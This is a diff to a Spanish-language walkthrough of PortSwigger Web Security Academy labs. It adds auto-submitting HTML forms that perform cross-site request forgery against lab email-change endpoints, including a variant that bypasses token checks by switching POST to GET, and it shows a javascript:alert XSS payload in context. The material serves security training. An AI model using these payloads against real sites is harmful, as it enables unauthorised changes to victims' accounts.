@@ -388,10 +388,25 @@ javascript:alert("1337")
 
 #### Solución:
 
-```
+```html
 <form method="POST" action="https://aced1f971f5a2e0d80c321bf00e30015.web-security-academy.net/email/change-email">
      <input type="hidden" name="email" value="asd@mail.com">
 <input type="hidden" name="csrf" value="OQJBSyA28bY0ntWPuDdNcDhU0xN4zavJ">
+</form>
+<script>
+      document.forms[0].submit();
+</script>
+```
+
+### [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
+
+Al autenticarse y hacer click en Update Email con el interceptor de burp activado, si mandamos esta request al repeater e intentamos cambiar el csrf, vemos que bloquea la petición; en cambio, si cambiamos el método de la petición de POST  a GET, vemos que el csrf ya no es validado. Para resolver el laboatorio completamos lo siguiente con la url del laboratorio (en la request de burp se puede hacer click derecho y copy url), teniendo en cuenta que el método de la request que no valida el csrf es GET.
+
+#### Solución:
+
+```html
+<form method="GET" action="https://ac521fc91fe8eb95801f0a93002a00ab.web-security-academy.net/email/change-email?email=algo%40mail.com&csrf=algo1234">
+     <input type="hidden" name="email" value="algo@mail">
 </form>
 <script>
       document.forms[0].submit();
